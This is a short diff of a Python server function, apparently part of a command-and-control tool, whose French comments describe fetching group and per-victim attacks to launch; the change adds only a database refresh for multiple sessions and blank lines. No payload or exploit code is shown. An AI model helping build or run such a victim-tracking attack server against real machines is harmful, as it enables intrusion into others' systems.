@@ -151,8 +151,10 @@ def start_server(port):
                                     os = client_os
                                 ))
 
+        db.cmd_refresh(1)# refresh de la base de donné pour le multisession
 
-        
+
+
         # Récupération des attaques de groupe à lancer
         attacks = get_group_attacks(mycursor)
 
@@ -205,6 +207,7 @@ def start_server(port):
 
 #########################################################################
         
+
 
         # Récupération des attaques individuelles à lancer
         attacks = get_victim_attacks(mycursor)
